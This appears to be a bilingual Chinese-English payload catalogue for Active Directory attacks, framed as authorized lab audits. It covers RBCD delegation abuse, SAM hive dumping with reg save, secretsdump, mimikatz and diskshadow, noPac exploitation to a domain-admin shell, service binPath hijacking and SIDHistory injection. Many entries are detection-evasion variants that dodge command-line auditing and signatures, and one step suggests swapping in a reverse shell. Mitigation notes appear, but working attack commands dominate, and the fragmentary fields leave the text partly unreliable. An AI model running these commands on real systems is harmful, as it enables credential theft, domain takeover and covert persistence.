opsecTips.en: Writing the RBCD attribute changes delegation behavior — use a self-created machine account, clear the attribute afterwards, and point S4U requests only at lab services.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 规避 PowerView 的 New-MachineAccount 模块特征：Linux 侧 LDAP 建机账户；返回成功即 RBCD 攻击体就绪。
description.en: Create the machine account via Linux-side LDAP, avoiding PowerView module signatures; success readies the RBCD attack principal.

description.zh: 替代 PowerShell 分步写属性：工具直接完成 msDS-AllowedToActOnBehalfOfOtherIdentity 写入；返回 SUCCESS 即成功。
description.en: Write the RBCD attribute in one tool-driven step replacing PowerShell; a SUCCESS return confirms it.

title.zh: AD 模块原生命令写属性

description.zh: 以官方模块替代攻击框架：管理命令写委派属性日志特征更弱；属性查询回显新值即成功。
description.en: Write the delegation attribute with the official module for a weaker log footprint; the attribute echoing the new value confirms success.

title.en: RBCD Delegation Attribute and ACL Audit Reviewed Command 1

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_RESOURCE_DELEGATION_E_1 与蓝队日志；成功时创建机器账户并输出创建成功信息。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_RESOURCE_DELEGATION_E_1 with blue-team logs; the machine account created with a success message confirms success.

title.zh: 改写 RBCD 委派属性
title.en: RBCD Delegation Attribute and ACL Audit Reviewed Command 2

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_RESOURCE_DELEGATION_E_2 与蓝队日志；成功时目标计算机的 msDS-AllowedToActOnBehalfOfOtherIdentity 包含新机器账户。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_RESOURCE_DELEGATION_E_2 with blue-team logs; the target computer msDS-AllowedToActOnBehalfOfOtherIdentity containing the new machine account confirms success.

title.zh: S4U 模拟取 CIFS 票据
title.en: RBCD Delegation Attribute and ACL Audit Reviewed Command 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_RESOURCE_DELEGATION_E_3 与蓝队日志；成功时 S4U 请求成功并取得目标 CIFS 服务的模拟票据。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_RESOURCE_DELEGATION_E_3 with blue-team logs; the S4U request succeeding with an impersonation ticket for the target CIFS service confirms success.

name.zh: SAM 本地哈希提取

description.zh: 以 SYSTEM 权限导出 SAM/SYSTEM 注册表 hive 或用 impacket secretsdump 提取本地哈希，验证终端凭据存储边界。
description.en: Exports the SAM and SECURITY registry hives with SYSTEM privilege or extracts local account hashes via impacket secretsdump, then cracks them offline to demonstrate the endpoint credential storage boundary.

subCategory.zh: 本机注册表与保护存储

overview.zh: 该 Payload 覆盖 SAM 凭据存储访问控制审计场景，检验本地账户哈希的读取路径与防护边界。验证维度含注册表导出、离线解析、Mimikatz 直读与卷影副本复制四步，对应第 1 至第 4 步。
overview.en: This payload covers SAM credential-store access-control auditing, testing read paths and protection boundaries for local account hashes. Validation covers registry export, offline parsing, direct Mimikatz reads and shadow-copy extraction, mapped to steps 1 through 4.

vulnerability.zh: 根因在于 SAM 配置单元依赖 SYSTEM 密钥加密而读取面暴露给高权限进程：具备管理员或卷影能力的攻击者可直接导出并离线还原全部本地账户哈希。
vulnerability.en: The root cause is the SAM hive being readable by high-privilege processes despite SYSTEM-key encryption: attackers with admin or shadow-copy capability export it directly and recover all local account hashes offline.

exploitation.zh: 第 1 步用 reg save 同时导出 SAM 与 SYSTEM 配置单元，生成两个 hive 即成功；第 2 步以 secretsdump.py LOCAL 模式离线解析输出 RID 与哈希；第 3 步用 mimikatz lsadump::sam 直读对照；第 4 步经卷影副本复制 SAM 验证绕过文件锁路径。任一路径产出哈希即确认存储可读。占位符在全局变量菜单替换；仅授权主机执行。
exploitation.en: In step 1, export SAM and SYSTEM together with reg save; two hives mark success. In step 2, parse offline with secretsdump.py LOCAL mode yielding RIDs and hashes. In step 3, cross-check with mimikatz lsadump::sam. In step 4, copy SAM via shadow copy validating the file-lock bypass. Any path producing hashes confirms readable storage. Replace placeholders via the global variables menu; run only on authorized hosts.

mitigation.zh:
限制 SAM 键与卷影服务访问权限，启用 LSA 保护进程（PPL）与 Credential Guard，对 reg save、vssadmin 调用实时告警：
    reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f
    reg add HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f
    Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} | ? { $_.Message -match "reg save|vssadmin|wbadmin" }
    修复后重放第 1、4 步，导出与复制应被拒绝并产生告警。
mitigation.en: Restrict access to SAM registry keys and the shadow-copy service, enable Credential Guard, and monitor reg save and vssadmin invocations. After the fix, replay steps 1 and 4: export and copy should be denied with alerts.

title.zh: 导出 SAM 与 SYSTEM 配置单元

description.zh: 用 reg save 分别导出 HKLM 下的 SAM 与 SYSTEM 配置单元；当前目录生成两个 hive 文件即拿到本地凭据存储副本，规避在线读取触发的告警。
description.en: Save the SAM and SYSTEM hives with reg save; two hive files on disk give an offline copy of local credential storage without tripping in-memory alerts.

attackChain.payload: reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM system.hive

description.zh: 用 secretsdump.py 以 sam 与 system 参数组合离线解析配置单元；输出本地账户 RID 与 NTLM 哈希即提取出可用于哈希传递的凭据材料。
description.en: Parse the hives offline with secretsdump.py -sam -system LOCAL; local RIDs and NTLM hashes come out as pass-the-hash material.

description.zh: 若文件导出受阻，改用 mimikatz 的 lsadump::sam 直接从内存读取；输出 SAM 账户哈希即确认第二条提取路径同样可用。
description.en: When file export is blocked, read directly with mimikatz lsadump::sam; SAM hashes still flowing out confirm a second extraction path.

title.en: Bypass file locks via shadow copy

description.zh: 用 vssadmin 创建卷影副本并从中复制被占用的 SAM 文件；绕过运行时锁定拿到副本后，交回第 2 步的命令继续离线解析。
description.en: Create a shadow copy with vssadmin and copy the in-use SAM out of it; the lock-free copy feeds straight back into the step-2 parsing.

opsecTips.zh: 导出的 SAM/SYSTEM hive 等同全部本地账户口令材料，实验后立即粉碎副本，不在共享目录暂存 hive 文件。
opsecTips.en: Treat exported SAM/SYSTEM hives as full local-password material, shred copies right after the session, and never stage them on shared folders.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

wafBypass.command: esentutl.exe /y C:\Windows\System32\config\SAM /d C:\Windows\Temp\sam.copy && esentutl.exe /y C:\Windows\System32\config\SYSTEM /d C:\Windows\Temp\sys.copy

description.zh: 绕过 reg save 命令的进程监控特征：以 esentutl 平滑复制 hive。成功判据：副本可被离线解析出 SAM 哈希。
description.en: Evades process monitoring on reg save by copying hives smoothly with esentutl. Success: the copies parse offline into SAM hashes.

wafBypass.command: (echo set context volatile nowriters & echo add volume C: alias s1 & echo create & echo expose %s1% Z: & echo exec "cmd /c copy Z:\Windows\System32\config\SAM C:\Windows\Temp\s2.hive") > C:\Windows\Temp\d.txt && diskshadow.exe /s C:\Windows\Temp\d.txt

description.zh: 绕过 vssadmin 特征并以易失卷影避免持久副本残留。成功判据：s2.hive 提取成功。
description.en: Evades vssadmin signatures and uses a volatile shadow to avoid persistent copy residue. Success: s2.hive is extracted.

explanation.zh: 易失卷影上下文（nowriters 为合法关键字）
explanation.en: volatile shadow context (nowriters is the valid keyword)

explanation.zh: 添加 C 盘卷影别名 s1
暴露卷影为 Z 盘
explanation.en: expose the shadow as drive Z:

description.zh: 绕过目标侧工具落地（mimikatz 等）：hive 已在操作机，目标无后续进程；离线解析模式无单用户过滤参数，解析后本地过滤目标账号。成功判据：输出中仅目标用户相关行被保留。
description.en: Evades tooling landing on the target (mimikatz etc.) since the hives are already on the operator machine; offline parsing has no single-user flag, so filter locally after parsing. Success: only the target user's lines remain in output.

explanation.zh: 解析后过滤目标用户（离线模式无单用户参数）
explanation.en: filter the target user after parsing (no single-user flag offline)

execution.command: reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM system.hive

description.zh: 导出 SAM 与 SYSTEM 配置单元；当前目录生成 sam.hive 与 system.hive 即导出成功。
description.en: Dump the SAM and SYSTEM hives; sam.hive and system.hive appearing in the current directory means the dump succeeded.

description.zh: 用 Impacket secretsdump.py 离线解析配置单元；输出本地账户 RID 与哈希即解析成功。
description.en: Parse the hives offline with Impacket secretsdump.py; printed local-account RIDs and hashes mean parsing succeeded.

description.zh: 用 Mimikatz lsadump::sam 直接读取；输出 SAM 账户哈希即确认本地凭据存储可读。
description.en: Read directly with Mimikatz lsadump::sam; printed SAM account hashes confirm the local credential store is readable.

description.zh: 从卷影副本复制 SAM；目标路径生成 sam.hive 即复制成功。
description.en: Copy SAM from the shadow copy; sam.hive generated at the target path means the copy succeeded.

name.zh: sAMAccountName/PAC 补丁边界审计

description.zh: 验证 noPac 链（CVE-2021-42278/42287）的机器账户改名与提权前提。
description.en: Renames a machine account to impersonate a user (CVE-2021-42278) and requests a ticket for the nonexistent name so the KDC auto-appends the dollar suffix (CVE-2021-42287), completing the noPac escalation on unpatched controllers.

subCategory.zh: 域控漏洞与已知利用链

overview.zh: sAMAccountName/PAC 补丁边界审计覆盖机器账号欺骗场景：针对未修补 CVE-2021-42278/42287 的域环境，验证能否借机器账号重命名与无 PAC 请求组合获得域管权限。验证维度涵盖 noPac 默认利用、交互 shell 模式与域配置基线核对三类步骤。
overview.en: sAMAccountName and PAC Patch-Boundary Audit covers machine-account spoofing: for domains without CVE-2021-42278/42287 patches, verify whether renaming machine accounts combined with PAC-less requests yields domain-admin privileges. Verification dimensions cover default noPac exploitation, interactive shell mode, and domain configuration baseline checks.

vulnerability.zh: 根因是 CVE-2021-42278 允许机器账号 sAMAccountName 冒充用户账户（末尾 $ 未严格校验），CVE-2021-42287 使 KDC 为不存在的账号自动补齐 $ 后缀查找；两者叠加让普通账号在机器账号配额内完成重命名后即可请求管理员 TGT。
vulnerability.en: The root cause is CVE-2021-42278 letting machine accounts spoof user accounts (trailing $ not strictly validated) combined with CVE-2021-42287 making the KDC auto-append $ when looking up nonexistent accounts; together, an ordinary account renames within the machine-account quota and then requests an administrator TGT.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步运行 noPac.py 默认模式，脚本自动创建机器账号、重命名并完成 sAMAccountName 欺骗，输出提权成功信息即确认漏洞存在；第 2 步加 -dc-host 与 -shell 进入域控交互 shell 验证实际控制；第 3 步用 Get-ADDomain 与 ms-DS-MachineAccountQuota 查询域功能级别与配额，记录缺口成立条件（补丁缺失、配额非 0）。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 runs noPac.py in default mode — the script creates a machine account, renames it, and completes the sAMAccountName spoof, and success output confirms the flaw; step 2 adds -dc-host and -shell for an interactive DC shell proving actual control; step 3 queries the domain functional level and ms-DS-MachineAccountQuota with Get-ADDomain to record gap conditions (missing patch, nonzero quota). Replace LAB_* placeholders via the global variables menu.

mitigation.en: Install 2021-11+ cumulative updates on all DCs fixing CVE-2021-42278/42287, set ms-DS-MachineAccountQuota to 0 or tighten machine-account creation rights, and monitor 4741/4742 machine-account creation and abnormal renames. After the fix, regress with the step 1 sample: the spoof chain must be rejected by the KDC.

title.zh: 检查机器账号配额前提

description.zh: 用 Get-ADObject 读取 ms-DS-MachineAccountQuota 与域模式；配额大于 0 即普通用户可自建机器账号，混淆攻击有土壤。
description.en: Read ms-DS-MachineAccountQuota and the domain mode with Get-ADObject; a positive quota lets normal users create machine accounts, enabling the spoof.

title.zh: 扫描 noPac 可利用性

description.zh: 运行 noPac.py -debug 对域控检测；输出存在漏洞的判定即 sAMAccountName 混淆与 PAC 校验缺陷组合可利用。
description.en: Probe the DC with noPac.py -debug; a vulnerable verdict means the sAMAccountName spoof plus PAC-validation flaw is exploitable.

title.zh: 混淆机器账号直取域管 shell
title.en: Spoof to a domain admin shell

description.zh: 加 -dc-host 与 -shell 参数重跑；返回以域管上下文执行的交互 shell 即一步拿下域控，完成机器账号名冒充提权。
description.en: Re-run with -dc-host and -shell; the domain-admin interactive shell takes the DC in one step via machine-account name spoofing.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 sAMAccountName/PAC 补丁边界审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for sAMAccountName and PAC Patch-Boundary Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: sAMAccountName/PAC 补丁边界审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: sAMAccountName and PAC Patch-Boundary Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 机器账号改名影响域内解析——使用专属实验机器账号并在验证后还原原名；票据请求频次保持个位数。
opsecTips.en: Renaming machine accounts disrupts domain resolution — use a dedicated lab machine account, restore its name afterwards, and keep ticket requests to single digits.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 以只读 LDAP 查询替代利用脚本探测 noPac 前提；配额非 0 即可自助建机账户。
description.en: Probe the noPac prerequisite via read-only LDAP instead of exploit scripts; a non-zero quota confirms self-service machine accounts are possible.

description.zh: 零利用流量判定修复状态；未列出 KB 即 sAMAccountName 伪装面存在。
description.en: Determine fix state with zero exploit traffic; missing KBs confirm the spoofing surface exists.

description.zh: 以 AD 模块筛查缺失 $ 后缀的异常机账户；返回结果即伪装痕迹。
description.en: Screen for machine accounts missing the $ suffix via the AD module; any result marks spoofing residue.

wafBypass.command:
wmic qfe get HotFixID | findstr /i "5007207"
powershell -NoProfile -Command "([ADSI]'LDAP://{LAB_DOMAIN_DN}').Properties['ms-DS-MachineAccountQuota']"

description.zh: 零利用流量判定 SAM The Admin 前提：补丁缺失且配额非 0 即链路成立。
description.en: Confirm both prerequisites with zero exploit traffic; missing patch plus non-zero quota validates the chain.

description.zh: 以只读属性查询替代利用工具探测委派状态；属性已有值或可写即后续链路可行。
description.en: Probe delegation state via read-only attribute queries instead of exploit tooling; an existing or writable attribute confirms chain feasibility.

description.zh: 换 LDAPS 通道执行同语义链路，规避明文 LDAP 检测；输出获取的 shell/hash 即成功。
description.en: Run the equivalent chain over LDAPS to evade cleartext LDAP detection; a captured shell/hash in output confirms success.

description.zh: 同一 noPac 链路改走 LDAPS：建机账户、改名与哈希获取都在 636 加密会话内完成，规避对明文 LDAP 会话内容的审计检测。判据：LDAPS 会话完成配额利用并取得 shell/hash。
description.en: Run the same noPac chain over LDAPS so machine-account creation, rename, and hash retrieval all ride the encrypted 636 session, evading cleartext-LDAP content auditing. Success: the quota exploit completes over LDAPS and yields a shell or hash.

description.zh: 组件化第二段：配额建机并给机器账号写入 msDS-AllowedToActOnBehalfOfOtherIdentity 后，直接以机器账号走 S4U2Self/S4U2Proxy 换 administrator 的 CIFS 服务票；进程审计只见 getST.py，不出现被重点签名的 noPac.py 一体化命令行。判据：产出 administrator@cifs 的 ccache 且可通过 SMB 会话验证。
description.en: Componentized second stage: once the machine account carries the RBC right, request the administrator CIFS ticket directly via S4U2Self/S4U2Proxy, so process auditing sees only getST.py and never the heavily signatured monolithic noPac command line. Success: an administrator@cifs ccache is produced and validates over SMB.

title.en: Supplementary noPac -dump form, not a bypass

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_SAMACCOUNTNAME_E_3 与蓝队日志；成功时转储域控凭据并输出结果。受控样例：用于建立基线/对照，非独立绕过手法。非绕过说明：本条为 noPac -dump 凭据转储的利用形态补充，与 execution[1] 的 -shell 路径同链路，按报告标注保留。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_SAMACCOUNTNAME_E_3 with blue-team logs; DC credentials dumped with results printed confirms success.Controlled sample: establishes the baseline or contrast group, not an independent bypass technique. Not a bypass: this is the noPac -dump credential-dump form on the same chain as execution[1], retained as a form supplement per the review.

title.en: sAMAccountName and PAC Patch-Boundary Audit Reviewed Command 1

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_SAMACCOUNTNAME_E_1 与蓝队日志；成功时创建机器账户并完成 sAMAccountName 欺骗，输出提权成功信息。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_SAMACCOUNTNAME_E_1 with blue-team logs; the machine account created and the sAMAccountName spoof succeeding with an escalation message confirms success.

title.en: sAMAccountName and PAC Patch-Boundary Audit Reviewed Command 2

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_SAMACCOUNTNAME_E_2 与蓝队日志；成功时获得域控上的交互 shell。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_SAMACCOUNTNAME_E_2 with blue-team logs; obtaining an interactive shell on the DC confirms success.

title.en: sAMAccountName and PAC Patch-Boundary Audit Reviewed Command 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_SAMACCOUNTNAME_E_3 与蓝队日志；成功时输出域功能级别与 ms-DS-MachineAccountQuota 值。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_SAMACCOUNTNAME_E_3 with blue-team logs; the domain functional level and ms-DS-MachineAccountQuota value returned confirms success.

name.zh: Windows 服务 ACL 与路径审计
name.en: Windows Service ACL and Path Audit

description.zh: 审计服务的 binpath、服务 ACL 与未引用路径，验证服务重配置提权路径。
description.en: Audits service binPath values, service ACLs, and unquoted space-containing paths, then reconfigures the service or plants a same-named binary so it launches attacker commands as LocalSystem.

overview.zh: 该 Payload 覆盖 Windows 服务 ACL 与路径提权审计场景，检验普通用户对服务配置的改写能力与执行上下文。验证维度含服务权限枚举、binPath 改写与重启触发三步，对应第 1 至第 3 步。
overview.en: This payload covers Windows service ACL and path escalation auditing, testing standard users' ability to rewrite service configuration and the execution context that follows. Validation covers service-permission enumeration, binPath rewriting and restart triggering, mapped to steps 1 through 3.

vulnerability.zh: 根因在于部分服务的 ACL 授予普通用户写权限或路径含空格未加引号：改写 binPath 或植入同名可执行文件后，服务以 LocalSystem 启动攻击者命令。
vulnerability.en: The root cause is some services granting write ACLs to standard users or holding unquoted spaced paths: after rewriting binPath or planting a same-named executable, the service launches attacker commands as LocalSystem.

exploitation.zh: 第 1 步用 accesschk 枚举普通用户可写服务，输出带全权限的服务清单即锁定目标；第 2 步以 sc config 改写目标服务 binPath 并用 qc 回读确认修改成功；第 3 步 stop 并 start 重启服务，命令以 SYSTEM 上下文执行即确认提权成立。以执行身份回显为成功判据。占位符在全局变量菜单替换；测试后恢复原 binPath。
exploitation.en: In step 1, enumerate standard-user-writable services with accesschk; the all-permissions service list locks onto targets. In step 2, rewrite the target binPath with sc config and confirm via qc read-back. In step 3, stop and start the service; the command executing as SYSTEM confirms escalation. Judge success by execution-identity output. Replace placeholders via the global variables menu; restore the original binPath after testing.

mitigation.zh:
收敛服务注册表 ACL 至仅 Administrators/SYSTEM 可写，修正带空格 binPath 引号，并监控 sc config 调用：
    sc.exe config {LAB_SERVICE} binPath= "\"C:\Program Files\App\svc.exe\""
    $k = "HKLM:\SYSTEM\CurrentControlSet\Services\{LAB_SERVICE}"
    $acl = Get-Acl $k
    $acl.Access | Where-Object { $_.IdentityReference -match 'Users' } | ForEach-Object { $acl.RemoveAccessRule($_) | Out-Null }
    Set-Acl $k $acl
mitigation.en: Periodically audit service ACLs with accesschk and revoke write grants, fix quoting and path ownership, and monitor sc config calls. After the fix, replay step 2: rewrites should be denied with access events logged.

description.zh: 用 accesschk 枚举 Users 组可修改配置的服务；输出含 SERVICE_ALL_ACCESS 的条目即锁定服务提权目标，优先选择可重启的服务。
description.en: Enumerate services the Users group can reconfigure with accesschk; entries with SERVICE_ALL_ACCESS become escalation targets, restartable ones first.

title.zh: 改写服务 binPath 注入命令
title.en: Rewrite binPath to inject a command

description.zh: 用 sc config 把目标服务的 binPath 改为待执行命令；qc 回读显示新路径即注入完成，等待下一次服务启动触发执行。
description.en: Point the target service's binPath at your command with sc config; a qc readback showing the new path means the payload is armed for the next start.

title.zh: 重启服务以 SYSTEM 执行
title.en: Restart the service to execute as SYSTEM

description.zh: 停止再启动目标服务触发 binPath 执行；命令以 LocalSystem 上下文运行即完成提权，可把命令换成反弹 shell 实现常驻控制。
description.en: Stop and start the service to fire the rewritten binPath; execution as LocalSystem completes escalation, or swap in a reverse shell to stay on the box.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 Windows 服务 ACL 与路径审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Windows Service ACL and Path Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: Windows 服务 ACL 与路径审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Windows Service ACL and Path Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: binPath 改写影响服务可用性——先导出原配置并在验证后立即还原；服务重启避开生产时段。
opsecTips.en: Rewriting binPath breaks service availability — export the original configuration first, restore it right after verification, and schedule restarts outside production hours.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: 规避变体：注册表直改 ImagePath

wafBypass.command: reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\{LAB_SERVICE} /v ImagePath /t REG_EXPAND_SZ /d "cmd /c whoami > C:\\Windows\\temp\\s.txt" /f

description.zh: 规避点：绕过 sc.exe 命令行审计，直接改注册表。判据：服务重启后 s.txt 生成。
description.en: Edits the registry directly to avoid sc.exe command-line auditing. Success: s.txt created after service restart.

title.zh: 规避变体：编码命令规避审计

description.zh: 规避点：base64 参数避免明文命令进入日志。判据：日志中无明文、命令仍执行。
description.en: Base64 keeps plaintext commands out of logs. Success: no plaintext logged yet command runs.

title.zh: 规避变体：服务失败恢复劫持

wafBypass.command: sc failure {LAB_SERVICE} reset= 86400 actions= restart/60000/command/60000 command= "cmd /c whoami > C:\\Windows\\temp\\f.txt"

description.zh: 规避点：不改 binPath，改失败恢复命令这一低频审计面。判据：服务崩溃后 f.txt 生成。
description.en: Modifies the rarely audited failure-recovery command instead of binPath. Success: f.txt created after crash.

title.zh: 规避变体：原始路径还原

wafBypass.command:
for /f "usebackq delims=" %v in (`type ImagePath.orig`) do reg add HKLM\SYSTEM\CurrentControlSet\Services\{LAB_SERVICE} /v ImagePath /t REG_EXPAND_SZ /d "%v" /f 
 sc stop {LAB_SERVICE} && sc start {LAB_SERVICE}

description.zh: 规避点：利用预留 .orig 值快速还原，缩短异常窗口。判据：ImagePath 恢复原始值。
description.en: Uses a stashed .orig value to restore quickly. Success: ImagePath back to original.

explanation.zh: 从预留文件读原始路径

explanation.en: write back the service registry key

explanation.zh: 恢复原始可展开路径值
explanation.en: restore the original expandable path value

description.zh: 用 accesschk 枚举普通用户可改的服务；输出带 SERVICE_ALL_ACCESS 的服务清单即确认提权面。
description.en: Enumerate services modifiable by standard users with accesschk; output listing services with SERVICE_ALL_ACCESS confirms the escalation surface.

description.zh: 改写目标服务 binPath；qc 回读显示新命令即修改成功，等待或触发服务启动执行。
description.en: Rewrite the target service binPath; qc reading back the new command means the change landed, pending service start for execution.

description.zh: 重启目标服务执行命令；命令以 LocalSystem 上下文执行即确认服务提权。
description.en: Restart the service to execute the command; execution under LocalSystem confirms service-based elevation.

name.zh: SIDHistory 越权注入

description.zh: 注入并枚举用户与组的 SIDHistory 属性，验证跨域提权效果与历史迁移残留痕迹。
description.en: Appends a high-privilege SID to a test account's SIDHistory attribute with the authorized directory write permission and shows the added authorization takes effect silently at next authentication, invisible to group-membership review.

overview.zh: 该 Payload 覆盖 SIDHistory 授权基线审计场景，检验账户附加 SID 对权限继承的操纵面。验证维度含 SID 注入、令牌组对照与指定账户审计三步，对应第 1 至第 3 步。
overview.en: This payload covers SIDHistory authorization-baseline auditing, testing how appended SIDs manipulate privilege inheritance. Validation covers SID injection, token-group comparison and per-account auditing, mapped to steps 1 through 3.

vulnerability.zh: 根因在于认证令牌展开 SIDHistory 属性参与授权：对目录具备写权限的攻击者给任意账户追加高权限 SID，权限随之静默继承且常规组成员审查不可见。
vulnerability.en: The root cause is authentication tokens expanding SIDHistory into authorization: attackers with directory-write rights append high-privilege SIDs to any account, silently inheriting access invisible to routine group reviews.

exploitation.zh: 第 1 步用 mimikatz 的 sid::add 向测试账户追加管理员 SID；第 2 步以 Get-ADUser 查询 sidHistory 并以 whoami 对照令牌组，确认注入 SID 进入授权上下文；第 3 步对指定账户逐一读取 sIDHistory 圈定超基线附加项。以注入 SID 出现在令牌组为判据。占位符在全局变量菜单替换；测试后立即清除注入。
exploitation.en: In step 1, append the Administrators SID to a test account with mimikatz sid::add. In step 2, query sidHistory with Get-ADUser and compare token groups via whoami, confirming the injected SID enters authorization. In step 3, read sIDHistory per chosen account isolating beyond-baseline appends. Judge by the injected SID in token groups. Replace placeholders via the global variables menu; purge injections immediately after testing.

mitigation.zh:
定期导出全部账户 sIDHistory 与迁移清单比对并清理注入值，回收目录写权限，监控属性变更：
    Get-ADUser -LDAPFilter '(sidHistory=*)' -Properties sidHistory
    Set-ADUser backdoor_user -Clear sidHistory
    auditpol /set /subcategory:"Directory Service Changes" /success /failure
mitigation.en: Regularly export all accounts' sIDHistory and diff against migration inventories, revoke directory-write rights, and alert on SIDHistory attribute changes. After the fix, replay step 1: injection should fail with change events firing.

title.zh: 注入管理员 SID 历史

description.zh: 用 mimikatz 的 sid::add 给 backdoor_user 追加 administrator 的 SID 历史；命令返回成功即普通账户静默继承域管权限。
description.en: Use sid::add to append the administrator SID to backdoor_user's history; on success the plain account silently inherits domain-admin rights.

description.zh: 查询该账户的 sidHistory 属性并以 whoami /all 检查令牌组；令牌中出现管理员 SID 即权限注入生效，可执行域管级操作。
description.en: Read the account's sidHistory and check whoami /all; the admin SID surfacing in the token groups proves the injected privilege is live.

title.en: Hunt existing injections in the domain

description.zh: 读取目标账户的 sIDHistory 属性并列出全部附加 SID；发现超出正常授权的条目即可复用其权限横向移动，顺藤摸瓜找隐蔽账户。
description.en: Dump target accounts' sIDHistory values; entries beyond legitimate grants expose reusable privilege and hidden pivot accounts.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 SIDHistory 授权基线审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for SIDHistory Authorization-Baseline Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: SIDHistory 授权基线审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: SIDHistory Authorization-Baseline Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: SIDHistory 写入会真实改变授权——绑定实验账户并在验证后清空属性；变更前后各留存一次 whoami /all 供审计。
opsecTips.en: Writing SIDHistory really changes authorization — bind it to a lab account, clear the attribute afterwards, and capture whoami /all before and after for the audit trail.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 以 DSInternals 在线复制通道替代 mimikatz sid::add 特征（模块真实 cmdlet 为 Add-ADReplSidHistory，Add-ADSidHistory 不存在），向 svc_backup 注入域管组历史 SID；需先以 Get-Credential 构造具备复制目录更改权限的域管凭据。成功判据：目标用户 sIDHistory 查询回显注入的 SID。
